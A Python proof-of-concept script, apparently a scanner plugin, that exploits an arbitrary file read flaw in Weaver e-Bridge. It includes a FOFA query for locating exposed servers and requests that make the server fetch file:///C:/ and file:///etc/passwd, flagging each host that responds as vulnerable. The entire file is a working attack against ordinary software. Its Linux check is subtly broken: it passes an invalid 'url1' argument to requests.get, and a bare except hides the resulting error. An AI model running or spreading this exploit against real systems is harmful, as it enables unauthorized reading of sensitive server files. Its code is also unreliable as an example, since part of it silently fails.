#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

from Config.config_proxies import proxies
from Config.config_requests import headers
from requests.packages.urllib3.exceptions import InsecureRequestWarning


########################################################################################################################
# 脚本信息
NAME='Weaver_e_Bridge_file_read'
AUTHOR="Faith"
REMARK='泛微云桥 e-Bridge 任意文件读取'
FOFA_RULE='title="泛微云桥e-Bridge"'
########################################################################################################################

def poc(target):
    result={}
    url = target + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
    url1 = target + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.get(url=url,headers=headers,verify=False,timeout=5,proxies=proxies)
        r1 = requests.get(url1=url1,headers=headers,verify=False,timeout=5,proxies=proxies)
        if r.status_code == 200 and "无法验证您的身份" not in r.text:
            result["target"] = target
            result["poc"] = NAME
            result["url"] = url
            result["system"] = "windows"
            return result
        else:
            pass
        if r1.status_code == 200 and "无法验证您的身份" not in r1.text:
            result["target"] = target
            result["poc"] = NAME
            result["url"] = url1
            result["system"] = "linux"
            return result
        else:
            pass

    except:
        pass

if __name__ == '__main__':
    poc("http://127.0.0.1")